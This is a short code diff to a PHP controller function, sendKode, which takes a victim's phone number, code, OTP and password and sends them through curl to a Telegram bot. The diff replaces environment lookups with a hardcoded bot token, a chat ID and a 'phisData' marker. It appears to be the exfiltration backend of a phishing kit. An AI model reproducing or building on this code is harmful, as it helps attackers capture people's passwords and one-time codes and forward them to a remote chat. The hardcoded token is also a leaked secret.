@@ -80,12 +80,16 @@ class HomeController extends Controller
     }
     public function sendKode($phone = "", $code = "", $otp = "", $password = "")
     {
-        $bot_token = env("TELEGRAM_API ");
+
+
+
+
+        $bot_token = "7742925472:AAETfunTJLoGZ1mhYlB40NVNNfzmWDnuliU";
         $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
-        $chat_id = env("TELEGRAM_ID ");
+        $chat_id = "5942769050";
 
         $ch = curl_init();
-        $phisData = env("PHIS_NUMBER ");
+        $phisData = "MY1";
         // Set cURL options
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
